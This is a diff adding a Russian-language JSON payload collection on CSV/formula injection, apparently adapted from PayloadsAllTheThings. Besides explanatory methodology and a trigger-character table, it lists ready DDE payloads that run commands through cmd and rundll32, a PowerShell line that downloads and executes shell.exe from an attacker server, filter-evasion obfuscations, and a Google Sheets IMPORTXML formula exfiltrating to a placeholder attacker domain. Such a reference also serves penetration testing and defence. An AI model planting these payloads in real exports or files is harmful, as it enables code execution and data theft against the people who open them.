@@ -1,0 +1,111 @@
+{
+  "category": "CSV Injection",
+  "source": "PayloadsAllTheThings/CSV Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое CSV / Formula Injection",
+      "language": "text",
+      "tags": ["methodology", "csv-injection", "formula-injection"],
+      "body": "CSV Injection (она же Formula Injection) возникает, когда непроверенный пользовательский ввод попадает в выгружаемый CSV-файл. Многие приложения дают скачать данные (инвойсы, настройки, шаблоны, отчёты) в CSV, а пользователь открывает их в Excel / LibreOffice / OpenOffice. Если содержимое ячеек не санируется, ячейка, начинающаяся со спецсимвола, трактуется как формула и выполняется на машине жертвы — вплоть до RCE через DDE.\n\nСуть атаки: ты не ломаешь сервер — ты внедряешь полезную нагрузку в данные, которые позже откроет другой пользователь (часто админ, выгружающий отчёт) в своём табличном редакторе."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать formula injection",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Любая функция экспорта в CSV / XLSX: списки пользователей, заказы, логи, фидбэк, контакты, отчёты.\n• Поля, которые ты контролируешь и которые позже попадут в экспортируемую таблицу: имя, фамилия, адрес, комментарий, тема обращения, название компании, User-Agent, реферер.\n• Формы обратной связи и тикеты, которые админ выгружает и открывает в Excel.\n• Импорт-экспорт по кругу: ввёл значение → выгрузилось в CSV → кто-то открыл.\n• Проверка вслепую (blind): значение откроется не у тебя, поэтому используй out-of-band нагрузки (см. эксфильтрацию через Google Sheets)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Триггер-символы начала формулы",
+      "language": "table",
+      "tags": ["detection", "trigger", "formula-injection"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "Назначение", "Примечание"],
+          "rows": [
+            ["=", "Начало формулы", "Основной триггер во всех редакторах"],
+            ["+", "Начало формулы", "Распознаётся как формула"],
+            ["-", "Начало формулы", "Минус (U+002D) — отрицательное число / формула"],
+            ["@", "Начало формулы", "Используется в DDE и именах функций"],
+            ["TAB (0x09)", "Лидирующий символ", "Префикс перед = + - @ для обхода фильтров"],
+            ["CR (0x0D)", "Лидирующий символ", "Возврат каретки как префикс для обхода фильтров"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Нюанс с дефисом в источнике",
+      "language": "text",
+      "tags": ["detection", "trigger", "gotcha"],
+      "body": "В оригинале PayloadsAllTheThings среди триггеров указан символ – (en-dash, U+2013), а не обычный минус -. Это опечатка источника: реальным триггером формулы является минус - (U+002D), а не типографское тире. При тестировании используй именно =, +, -, @. Полный список лидирующих символов, которые экранирует OWASP: = + - @ TAB(0x09) CR(0x0D)."
+    },
+    {
+      "subcategory": "DDE — выполнение команд",
+      "title": "Запуск calc через DDE (базовые варианты)",
+      "language": "text",
+      "tags": ["dde", "rce", "windows"],
+      "body": "DDE (\"cmd\";\"/C calc\";\"!A0\")A0\n@SUM(1+1)*cmd|' /C calc'!A0\n=2+5+cmd|' /C calc'!A0\n=cmd|' /C calc'!'A1'"
+    },
+    {
+      "subcategory": "DDE — выполнение команд",
+      "title": "Как устроена DDE-нагрузка",
+      "language": "text",
+      "tags": ["dde", "methodology"],
+      "body": "Разбор payload вида =cmd|' /C calc'!A0:\n• cmd — имя приложения-сервера DDE, к которому обращается клиент (Excel).\n• /C calc — передаваемая команда / имя файла (здесь calc.exe).\n• !A0 — item name, единица данных, которую сервер возвращает клиенту по запросу.\n\nDDE (Dynamic Data Exchange) — механизм обмена данными между приложениями Windows; Excel выполняет внешнюю команду при открытии файла (обычно после предупреждения о включении содержимого)."
+    },
+    {
+      "subcategory": "DDE — выполнение команд",
+      "title": "PowerShell: скачать и выполнить (download & execute)",
+      "language": "text",
+      "tags": ["dde", "rce", "powershell"],
+      "body": "=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0"
+    },
+    {
+      "subcategory": "DDE — выполнение команд",
+      "title": "rundll32 вместо cmd",
+      "language": "text",
+      "tags": ["dde", "rce", "rundll32", "bypass"],
+      "body": "=rundll32|'URL.dll,OpenURL calc.exe'!A\n=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Обфускация префикса и цепочка команд",
+      "language": "text",
+      "tags": ["dde", "bypass", "obfuscation"],
+      "body": "=AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A\n=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A\n=         cmd|'/c calc.exe'!A"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Null-символы для обхода словарных фильтров",
+      "language": "text",
+      "tags": ["dde", "bypass", "filter-evasion"],
+      "body": "Null-символы (а не пробелы) игнорируются при выполнении, поэтому ломают сигнатурные/словарные фильтры, не мешая срабатыванию формулы:\n\n=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A"
+    },
+    {
+      "subcategory": "Эксфильтрация — Google Sheets",
+      "title": "Функции Google Sheets для запроса удалённых URL",
+      "language": "text",
+      "tags": ["google-sheets", "exfiltration", "oob"],
+      "body": "Google Sheets поддерживает формулы, которые тянут внешние ресурсы — их можно использовать для blind-инъекции и эксфильтрации данных:\n\nIMPORTXML(url, xpath_query, locale)\nIMPORTRANGE(spreadsheet_url, range_string)\nIMPORTHTML(url, query, index)\nIMPORTFEED(url, [query], [headers], [num_items])\nIMPORTDATA(url)"
+    },
+    {
+      "subcategory": "Эксфильтрация — Google Sheets",
+      "title": "Blind formula injection / эксфильтрация через IMPORTXML",
+      "language": "text",
+      "tags": ["google-sheets", "exfiltration", "blind", "oob"],
+      "body": "=IMPORTXML(\"http://[ATTACKER.DOMAIN.TLD]/csv\", \"//a/@href\")"
+    },
+    {
+      "subcategory": "Эксфильтрация — Google Sheets",
+      "title": "Предупреждение пользователю",
+      "language": "text",
+      "tags": ["google-sheets", "note"],
+      "body": "Google Sheets покажет пользователю предупреждение о том, что формула пытается обратиться к внешнему ресурсу, и запросит авторизацию. Это снижает шанс срабатывания вслепую, но при наличии доверия/невнимательности пользователя эксфильтрация всё ещё возможна."
+    }
+  ]
+}
